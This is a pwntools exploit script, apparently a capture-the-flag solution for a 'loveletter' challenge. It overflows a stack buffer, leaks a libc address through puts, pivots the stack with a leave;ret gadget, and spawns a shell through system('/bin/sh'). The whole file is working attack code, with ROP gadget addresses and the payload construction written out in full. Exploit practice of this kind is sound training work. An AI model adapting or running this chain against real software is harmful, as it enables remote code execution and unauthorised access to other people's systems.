from pwn import *

exe = context.binary = ELF('./main_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
r = exe.process()
gdb.attach(r, api=True, gdbscript='''
           b*0x000000000040140a
           b*0x000000000040141d
           ''')

# r = remote('loveletter.securinets.tn', 4040)

pop_rdi = 0x00000000004014b3
pop_rsi = 0x00000000004014b1
leave_ret = 0x0000000000401213
ret = 0x000000000040101a
pop_rbp = 0x00000000004011bd
addr = 0x404150+0x700

payload = b'a'*4000
r.sendafter(b'> ', payload)
payload = b'a'*2969
r.sendafter(b'> ', payload)
r.sendafter(b'> ', b'Y')

payload = b'a'*256
payload += flat(
    addr - 8, # overwrite saverbp
    pop_rdi, exe.got['puts'],
    exe.sym['puts'], # puts(putsgot); trong putsgot chua libc
    pop_rdi, addr,
    pop_rsi, 0x100, 0,
    ret,
    exe.sym['readInput'], #readInput(addr, 0x100)
    leave_ret # leave ret ; = mov rsp, rbp ; pop rbp ; -> rsp = addr
)
r.sendafter(b'> ', payload)
r.recvuntil(b'friend!\n')
libc_leak = r.recv(6)
libc.address = u64(libc_leak + b'\x00'*2) - libc.sym['puts']
print(hex(libc.address))

payload = p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.sendafter(b'> ', payload)

r.interactive()